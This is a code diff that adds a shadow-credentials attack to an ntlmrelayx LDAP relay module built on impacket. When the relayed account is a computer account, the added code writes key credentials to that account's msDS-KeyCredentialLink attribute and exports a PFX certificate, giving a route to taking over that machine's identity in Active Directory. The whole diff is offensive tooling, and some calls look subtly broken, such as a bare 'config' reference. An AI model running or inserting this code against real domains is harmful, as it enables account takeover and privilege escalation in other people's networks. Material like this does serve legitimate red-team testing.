@@ -33,6 +33,7 @@ from Cryptodome.Hash import MD4
 from impacket import LOG
 from impacket.examples.ldap_shell import LdapShell
 from comm.ntlmrelayx.attacks import ProtocolAttack
+from comm.ntlmrelayx.attacks.shadowCredential import ShadowCredentials
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
@@ -110,6 +111,8 @@ class LDAPAttack(ProtocolAttack):
 
     def __init__(self, config, LDAPClient, username):
         self.computerName = '' if config.addcomputer == 'Rand' else config.addcomputer
+        self.userDomain = config.userDomain
+        self.kdc = config.kdc
         ProtocolAttack.__init__(self, config, LDAPClient, username)
         if self.config.interactive:
             # Launch locally listening interactive shell.
@@ -233,6 +236,12 @@ class LDAPAttack(ProtocolAttack):
             _thread.interrupt_main()
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
+    
+    def shadowCredentialAttack(self, domainDumper, ldap_session, target):
+        shadowcreds = ShadowCredentials(domainDumper, ldap_session, target)
+        shadowcreds.add(export_type="PFX", domain=self.config.userDomain, password=None, path=target.replace("$",""), dc_ip=self.config.kdc)
+        config.set_targetName(target)
+        config.set_priv(True)
 
     def delegateAttack(self, usersam, targetsam, domainDumper, sid):
         global delegatePerformed
@@ -707,6 +716,15 @@ class LDAPAttack(ProtocolAttack):
                 else:
                     LOG.info("Successfully dumped %d gMSA passwords through relayed account %s" % (count, self.username))
                     fd.close()
+
+        if self.config.shadowcredential and self.username[-1] == '$':
+            try:
+                success = self.client.search(domainDumper.root, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+                self.shadowCredentialAttack(domainDumper,self.client,self.username)
+            except Exception as e:
+                LOG.error("The target Domain Functional Level must be **Windows Server 2016** or above")
+                config.set_priv(True)
+                return
 
         # Perform the Delegate attack if it is enabled and we relayed a computer account
         if self.config.delegateaccess and self.username[-1] == '$':
